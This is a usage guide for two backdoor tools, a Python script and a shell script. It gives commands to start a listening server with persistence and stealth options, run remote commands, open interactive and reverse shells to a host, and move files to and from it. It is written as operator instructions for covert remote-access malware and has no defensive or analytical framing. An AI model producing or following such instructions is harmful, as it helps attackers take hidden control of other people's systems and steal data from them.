Setup & Usage Instructions:
Python Backdoor:
Install dependencies:

bash
pip install cryptography aiofiles psutil
Generate SSL certificates (optional):

bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
Start server:

bash
# Basic server
python3 backdoor.py --server --port 4433

# With SSL
python3 backdoor.py --server --ssl-cert cert.pem --ssl-key key.pem

# With persistence
python3 backdoor.py --server --persistent

# Save the generated key for client connections
Connect as client:

bash
# Interactive mode
python3 backdoor.py --client --host 192.168.1.100 --port 4433 --key <key>

# Execute single command
python3 backdoor.py --client --host 192.168.1.100 --command "uname -a"

# Start interactive shell
python3 backdoor.py --client --host 192.168.1.100 --shell

# Upload file
python3 backdoor.py --client --host 192.168.1.100 --upload local.txt remote.txt

# Download file
python3 backdoor.py --client --host 192.168.1.100 --download remote.txt local.txt
Shell Backdoor:
Make executable:

bash
chmod +x backdoor.sh
Start server:

bash
# Basic server
./backdoor.sh --server

# Custom port
PORT=5555 ./backdoor.sh --server

# With stealth
STEALTH_MODE=true ./backdoor.sh --server
Connect as client:

bash
# Interactive client
./backdoor.sh --client 192.168.1.100

# Reverse shell
./backdoor.sh --reverse 192.168.1.100 4444

# Port knocking detection
./backdoor.sh --knock
